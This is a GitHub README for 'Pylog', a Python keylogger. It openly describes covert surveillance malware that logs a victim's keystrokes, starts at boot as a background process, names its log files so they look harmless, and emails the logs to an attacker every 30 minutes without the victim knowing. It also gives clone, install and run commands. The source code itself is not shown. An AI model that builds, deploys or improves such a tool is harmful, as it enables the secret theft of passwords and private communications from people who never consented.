# Pylog-Python-Keylogger

[![MIT Licence](https://badges.frapsoft.com/os/mit/mit.png?v=103)](https://opensource.org/licenses/mit-license.php)

## A Keylogger that sends keystrokes to email.
Welcome to the simple keylogger repo! A keylogger is a program that records your keystrokes, and this program saves them in a log file on your local computer and then periodically sends the log file as an attachment to an attacker's email without the victim knowing.

It is set to load at startup so it ensures that all keystrokes is logged. It has been modified to check if there is an internet connection and if not -record all keystrokes to a log file.

Feel free to fork and improve it if you want. Be sure to check out the [issues](https://github.com/DennisKoskei/pylog-python-keylogger/issues) or [pull requests](https://github.com/DennisKoskei/pylog-python-keylogger/pulls) to see if your problem has been fixed, or to help out others.

## Contents- [Pylog-Python-Keylogger](#pylog-python-keylogger)
- [Pylog-Python-Keylogger](#pylog-python-keylogger)
  - [A Keylogger that sends keystrokes to email.](#a-keylogger-that-sends-keystrokes-to-email)
  - [Contents- Pylog-Python-Keylogger](#contents--pylog-python-keylogger)
  - [Objectives](#objectives)
  - [Workflow](#workflow)
  - [Questions that arise in Development?](#questions-that-arise-in-development)
  - [How to run](#how-to-run)
  - [References](#references)

## Objectives
1. The keylogger periodically sends the keystrokes of the victim to a specified email
2. On startup:
   1. checks if python is installed
   2. if so then install requirements
   3. Then run main file as a background process
3. Log file will be created with current timestamp to store all the keystrokes.
4. Check if there is an internet connection then:
   1. Record keystrokes to a file for 30 minutes, send that file via email then delete the locally saved log file.
5. If no internet connecton then log event to the log file and wait to send in the next cycle (then create new log file with title of new current timestamp)
8. If there is a pause for 30 seconds save to log file ("pause")

## Workflow
1. Listen for keystorkes in the background
2. If keystroke is entered, record the keystrokes in a list and then if the activity stops for 5 seconds push the saved text to a text/log file with a filename that has a non-suspicious filename with a timestamp.
3. After every 30 minutes, check if there is an internet connection
   1. If so then attach the saved log file to the email and send, then delete file in local storage.
   2. If there is no internet connection, then push text  ("Victim is still offline at {timestamp}) and continue the cycle.


## Questions that arise in Development?
1. How to send the keystrokes to an email?
2. How to ensure that it is continuously running in the background?
3. Save keystrokes to a file in current directory
4. How to make python perfrom a task after every 30 minutes
   1. How to attach a file to the email, send it and delete log_file in current directory.
5. How to set up keylogger.py to run at startup in linux
6. 

## How to run
1. Install it:
```python 
$ git clone https://github.com/DennisKoskei/pylog-python-keylogger.git
```

2. Change directory to the src folder where the main keylogger.py is

```python
 cd src/ 
```
3. Install the necessary modules 
```python
pip install -r requirements.txt
```
4. Then run the main file

```python
python keylogger.py
```

---
## References

[Keyboard Logger on pyinput](https://pypi.org/project/pynput/)

[Send Emails using Python](https://realpython.com/python-send-email/)

[pyxhook- keystroke monitoring library for linux](https://pypi.org/project/pyxhook/)